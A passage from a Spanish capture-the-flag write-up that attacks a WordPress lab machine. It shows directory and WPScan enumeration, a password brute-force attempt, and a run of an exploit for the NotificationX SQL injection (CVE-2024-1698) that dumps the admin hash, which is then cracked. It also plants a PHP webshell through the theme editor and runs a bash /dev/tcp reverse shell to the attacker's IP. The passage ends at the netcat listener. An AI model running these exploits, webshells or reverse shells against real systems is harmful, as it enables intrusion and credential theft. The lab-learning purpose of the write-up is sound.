+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://192.168.10.210/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">300</span> -x php,html,txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://192.168.10.210/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              php,html,txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 34459<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/wp-content           <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 323<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.10.210/wp-content/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/wp-login.php         <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 7568<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/license.txt          <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 19915<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/wp-includes          <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 324<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.10.210/wp-includes/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/readme.html          <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 7399<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/wp-admin             <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 321<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.10.210/wp-admin/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/xmlrpc.php           <span style="color:#f92672">(</span>Status: 405<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 42<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.php                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 280<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.html                <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 280<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/wp-signup.php        <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://debugsec.thl/wp-login.php?action<span style="color:#f92672">=</span>register<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/server-status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 280<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">882180</span> / <span style="color:#ae81ff">882184</span> <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-x</em></td>
+					<td>Para indicar extensiones de archivos a buscar.</td>
+			</tr>
+	</tbody>
+</table>
+<p>No veo algo como tal que haya sido creado por un usuario, pero lo que sí vemos, es el <strong>xml-rpc</strong> activo, por lo que podríamos aplicar fuerza bruta más adelante.</p>
+<p>Vamos a enumerar la página de <strong>WordPress</strong> con <strong>WPScan</strong>.</p>
+<h3 id="WPScan">Enumeración de WordPress con WPScan</h3>
+<p>Vamos a tratar de enumerar los plugins y veamos si existe otro usuario aparte del <strong>usuario wordpress</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wpscan --url http://debugsec.thl --enumerate vp,u --plugins-detection aggressive --no-banner
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> It seems like you have not updated the database <span style="color:#66d9ef">for</span> some time.
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> URL: http://debugsec.thl/ <span style="color:#f92672">[</span>192.168.10.210<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Started: Tue Jul <span style="color:#ae81ff">22</span> 12:04:59 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Interesting Finding<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Headers
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> | Interesting Entry: Server: Apache/2.4.59 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> | Found By: Headers <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> | Confidence: 100%
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> robots.txt found: http://debugsec.thl/robots.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> | Interesting Entries:
+</span></span><span style="display:flex;"><span> |  - /wp-admin/
+</span></span><span style="display:flex;"><span> |  - /wp-admin/admin-ajax.php
+</span></span><span style="display:flex;"><span> | Found By: Robots Txt <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> | Confidence: 100%
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> WordPress theme in use: twentytwentyone
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> | Location: http://debugsec.thl/wp-content/themes/twentytwentyone/
+</span></span><span style="display:flex;"><span> | Last Updated: 2024-11-13T00:00:00.000Z
+</span></span><span style="display:flex;"><span> | Readme: http://debugsec.thl/wp-content/themes/twentytwentyone/readme.txt
+</span></span><span style="display:flex;"><span> | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> The version is out of date, the latest version is 2.4
+</span></span><span style="display:flex;"><span> | Style URL: http://debugsec.thl/wp-content/themes/twentytwentyone/style.css?ver<span style="color:#f92672">=</span>1.9
+</span></span><span style="display:flex;"><span> | Style Name: Twenty Twenty-One
+</span></span><span style="display:flex;"><span> | Style URI: https://wordpress.org/themes/twentytwentyone/
+</span></span><span style="display:flex;"><span> | Description: Twenty Twenty-One is a blank canvas <span style="color:#66d9ef">for</span> your ideas and it makes the block editor your best brush. Wi...
+</span></span><span style="display:flex;"><span> | Author: the WordPress team
+</span></span><span style="display:flex;"><span> | Author URI: https://wordpress.org/
+</span></span><span style="display:flex;"><span> |
+</span></span><span style="display:flex;"><span> | Found By: Css Style In Homepage <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> | Confirmed By: Css Style In <span style="color:#ae81ff">404</span> Page <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |
+</span></span><span style="display:flex;"><span> | Version: 1.9 <span style="color:#f92672">(</span>80% confidence<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> | Found By: Style <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |  - http://debugsec.thl/wp-content/themes/twentytwentyone/style.css?ver<span style="color:#f92672">=</span>1.9, Match: <span style="color:#e6db74">&#39;Version: 1.9&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerating Vulnerable Plugins <span style="color:#f92672">(</span>via Aggressive Methods<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> Checking Known Locations - Time: 00:02:39 &lt;<span style="color:#f92672">============================================================================================================</span>&gt; <span style="color:#f92672">(</span><span style="color:#ae81ff">7343</span> / 7343<span style="color:#f92672">)</span> 100.00% Time: 00:02:39
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Checking Plugin Versions <span style="color:#f92672">(</span>via Passive and Aggressive Methods<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> No plugins Found.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerating Users <span style="color:#f92672">(</span>via Passive and Aggressive Methods<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> Brute Forcing Author IDs - Time: 00:00:00 &lt;<span style="color:#f92672">================================================================================================================</span>&gt; <span style="color:#f92672">(</span><span style="color:#ae81ff">10</span> / 10<span style="color:#f92672">)</span> 100.00% Time: 00:00:00
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> User<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> Identified:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> wordpress
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> | Found By: Rss Generator <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> | Confirmed By:
+</span></span><span style="display:flex;"><span> |  Wp Json Api <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |   - http://debugsec.thl/wp-json/wp/v2/users/?per_page<span style="color:#f92672">=</span>100&amp;page<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span> |  Oembed API - Author URL <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |   - http://debugsec.thl/wp-json/oembed/1.0/embed?url<span style="color:#f92672">=</span>http://debugsec.thl/&amp;format<span style="color:#f92672">=</span>json
+</span></span><span style="display:flex;"><span> |  Rss Generator <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |  Author Id Brute Forcing - Author Pattern <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> No WPScan API Token given, as a result vulnerability data has not been output.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> You can get a free API token with <span style="color:#ae81ff">25</span> daily requests by registering at https://wpscan.com/register
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Finished: Tue Jul <span style="color:#ae81ff">22</span> 12:07:44 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Requests Done: <span style="color:#ae81ff">7399</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Cached Requests: <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Data Sent: 1.972 MB
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Data Received: 2.513 MB
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Memory used: 242.699 MB
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Elapsed time: 00:02:45
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>&ndash;url</em></td>
+					<td>Para indicar la URL a escanear.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;enumerate</em></td>
+					<td>Indicando que aplique enumeración, puede ser de usuarios (<code>u</code>), de plugins vulnerables (<code>vp</code>), etc.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;plugins-detection</em></td>
+					<td>Para indicar un modo de detección de plugins, se puede elegir entre <code>passive</code> (pasivo), <code>mixed</code> (mixto) y <code>agressive</code> (agresivo).</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;no-banner</em></td>
+					<td>Para no mostrar el banner de la herramienta.</td>
+			</tr>
+	</tbody>
+</table>
+<p>El escaneo no pudo encontrar los plugins usados o un nuevo usuario.</p>
+<p>Podemos intentar aplicarle fuerza bruta (que no funcionará), para ver si obtiene algún plugin:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wpscan --url http://debugsec.thl --password-attack xmlrpc -t <span style="color:#ae81ff">20</span> -U <span style="color:#e6db74">&#39;wordpress&#39;</span> -P /usr/share/wordlists/rockyou.txt --no-banner
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> It seems like you have not updated the database <span style="color:#66d9ef">for</span> some time.
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> URL: http://debugsec.thl/ <span style="color:#f92672">[</span>192.168.10.210<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Started: Tue Jul <span style="color:#ae81ff">22</span> 12:10:01 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerating All Plugins <span style="color:#f92672">(</span>via Passive Methods<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Checking Plugin Versions <span style="color:#f92672">(</span>via Passive and Aggressive Methods<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Plugin<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> Identified:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> notificationx
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> | Location: http://debugsec.thl/wp-content/plugins/notificationx/
+</span></span><span style="display:flex;"><span> | Last Updated: 2025-03-24T09:55:00.000Z
+</span></span><span style="display:flex;"><span> | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> The version is out of date, the latest version is 3.0.4
+</span></span><span style="display:flex;"><span> |
+</span></span><span style="display:flex;"><span> | Found By: Urls In Homepage <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> | Confirmed By: Urls In <span style="color:#ae81ff">404</span> Page <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |
+</span></span><span style="display:flex;"><span> | Version: 2.8.2 <span style="color:#f92672">(</span>100% confidence<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> | Found By: Readme - Stable Tag <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |  - http://debugsec.thl/wp-content/plugins/notificationx/README.txt
+</span></span><span style="display:flex;"><span> | Confirmed By: Readme - ChangeLog Section <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |  - http://debugsec.thl/wp-content/plugins/notificationx/README.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerating Config Backups <span style="color:#f92672">(</span>via Passive and Aggressive Methods<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> Checking Config Backups - Time: 00:00:03 &lt;<span style="color:#f92672">===============================================================================================================</span>&gt; <span style="color:#f92672">(</span><span style="color:#ae81ff">137</span> / 137<span style="color:#f92672">)</span> 100.00% Time: 00:00:03
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Finished: Tue Jul <span style="color:#ae81ff">22</span> 12:10:08 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Requests Done: <span style="color:#ae81ff">139</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Cached Requests: <span style="color:#ae81ff">41</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Data Sent: 35.082 KB
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Data Received: 68.662 KB
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Memory used: 262.695 MB
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Elapsed time: 00:00:07
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Scan Aborted: The XML-RPC Interface was not detected.
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>&ndash;password-attack</em></td>
+					<td>Para elegir un ataque suministrado en lugar de determinar uno automáticamente. Puede ser <code>wp-login, xmlrpc, xmlrpc-multicall</code></td>
+			</tr>
+			<tr>
+					<td><em>-U</em></td>
+					<td>Indica una lista de usuarios o un usuario.</td>
+			</tr>
+			<tr>
+					<td><em>-P</em></td>
+					<td>Indica un wordlist de contraseñas.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Excelente, pudo detectar el uso del plugin <strong>notificationx 2.8.2</strong>.</p>
+<p>Puede que este plugin sea vulnerable, por lo que necesitamos investigar y buscar un Exploit.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="Exploit">Probando Exploit: Unauthenticated blind SQLi in NotificationX WordPress plugin - CVE-2024-1698</h3>
+<p>Investigando, encontramos que el plugin <strong>notificationx 2.8.2</strong> es vulnerable a <strong>Blind SQL Injection</strong>.</p>
+<p>Aquí dejo el blog de <strong>Vicarius</strong> que explica bastante bien la vulnerabilidad y nos da un script que sirve para explotarla:</p>
+<ul>
+<li><a href="https://www.vicarius.io/vsociety/posts/exploiting-the-unexploited-unauthenticated-blind-sqli-in-notificationx-wordpress-plugin-cve-2024-1698-a-novel-exploit-for-novel-folks" target="_blank">Exploiting the unexploited - Unauthenticated blind SQLi in NotificationX WordPress plugin - CVE-2024-1698 - A novel exploit for novel folks</a></li>
+</ul>
+<p>A su vez, también podemos utilizar este Exploit de un usuario de <strong>GitHub</strong>:</p>
+<ul>
+<li><a href="https://github.com/kamranhasan/CVE-2024-1698-Exploit" target="_blank">CVE-2024-1698 Exploit Script - Wordpress NotificationX &lt;= 2.8.2 - SQL Injection</a></li>
+</ul>
+<p>Yo utilizaré el de <strong>Vicarius</strong>, solo tienes que copiarlo y guardarlo en tu máquina.</p>
+<p>En resumen de este Exploit:</p>
+<ul>
+<li>El plugin <strong>notificationx versión 2.8.2</strong> es vulnerable a <strong>Unauthenticated Blind SQL Injections</strong> a través del parámetro <strong>type</strong> que se usa en la ruta <code>http://IP/wp-json/notificationx/v1/analytics</code>.</li>
+<li>El Exploit busca y obtiene el hash del <strong>usuario admin</strong> o del usuario que tenga el ID como 1.</li>
+<li>A través de una <strong>petición POST</strong>, podemos probar la <strong>Blind SQLi</strong>:</li>
+</ul>
+<p align="center">
+<img src="/assets/images/THL-writeup-debugsec/Captura5.png">
+</p>
+<p>Veamos de qué forma se usa el Exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 notificationx_Exploit.py
+</span></span><span style="display:flex;"><span>usage: notificationx_Exploit.py <span style="color:#f92672">[</span>-h<span style="color:#f92672">]</span> --url URL <span style="color:#f92672">[</span>--sleep-time SLEEP_TIME<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--debug<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>notificationx_Exploit.py: error: the following arguments are required: --url
+</span></span></code></pre></div><p>Solamente debemos darle la URL de la página web vulnerable.</p>
+<p>Podríamos darle la flag <code>--debug</code> y el <code>--sleep-time</code> para que nos vaya mostrando cada carácter encontrado, aunque no es necesario.</p>
+<p>Vamos a ejecutarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 notificationx_Exploit.py --url http://debugsec.thl
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> The WordPress instance seems to be vulnerable to CVE-2024-1698.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> WordPress admin password hash: $P$BeoVY5FZYWg4j90BEh5Cme9j3Zamqx/
+</span></span></code></pre></div><p>Tenemos el hash, así que guárdalo en un archivo.</p>
+<p>Ahora con <strong>JohnTheRipper</strong> lo crackeamos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john -w:/usr/share/wordlists/rockyou.txt adminHash.txt
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>phpass <span style="color:#f92672">[</span>phpass <span style="color:#f92672">(</span>$P$ or $H$<span style="color:#f92672">)</span> 128/128 SSE2 4x3<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">8192</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">6</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>******         <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:00:14 DONE <span style="color:#f92672">(</span>2025-07-22 12:18<span style="color:#f92672">)</span> 0.07102g/s 21313p/s 21313c/s 21313C/s memee..may1889
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show --format=phpass&#34;</span> options to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>Genial, tenemos la contraseña del administrador o, en este caso, del <strong>usuario wordpress</strong>.</p>
+<p>Probémosla:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-debugsec/Captura6.png">
+</p>
+<p>Estamos dentro.</p>
+<h3 id="WebShell">Modificando Tema con Editor de Temas para Crear WebShell y Ganando Acceso a la Máquina</h3>
+<p>Podemos modificar un tema para que ejecute una <strong>Reverse Shell</strong> o para crear una <strong>WebShell</strong>. Yo haré lo segundo.</p>
+<p>Del lado izquierdo, encontraremos el <strong>Editor de Temas</strong> en la sección <strong>Apariencia</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-debugsec/Captura7.png">
+</p>
+<p>Entra ahí y harás lo siguiente:</p>
+<ul>
+<li>Selecciona un tema que no se esté usando.</li>
+<li>Revisa y usa uno de los archivos que ejecute código <strong>PHP</strong>.</li>
+<li>Modifícalo y agrega la siguiente instrucción para crear una <strong>WebShell</strong> (en caso de que quieras una <strong>Reverse Shell</strong>, aquí la puedes poner): <code>system($_GET['cmd']);</code></li>
+<li>Guarda los cambios y recuerda la ruta donde se encuentra el archivo que usaste.</li>
+</ul>
+<p align="center">
+<img src="/assets/images/THL-writeup-debugsec/Captura8.png">
+</p>
+<p>Bien, ya solo tenemos que visitar nuestra <strong>WebShell o Reverse Shell</strong>.</p>
+<p>Sería esta ruta: <code>http://IP/wp-content/themes/Nombre_Tema_Usado/pattern/archivo_usado.php</code></p>
+<p>Probémoslo:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-debugsec/Captura9.png">
+</p>
+<p>Ya tenemos nuestra <strong>WebShell</strong>.</p>
+<p>Abre un listener con <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Ejecuta la siguiente <strong>Reverse Shell</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#39;bash -i &gt;%26 /dev/tcp/Tu_IP/443 0&gt;%261&#39;</span>
+</span></span></code></pre></div><p align="center">
+<img src="/assets/images/THL-writeup-debugsec/Captura10.png">
+</p>
+<p>Observa la <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
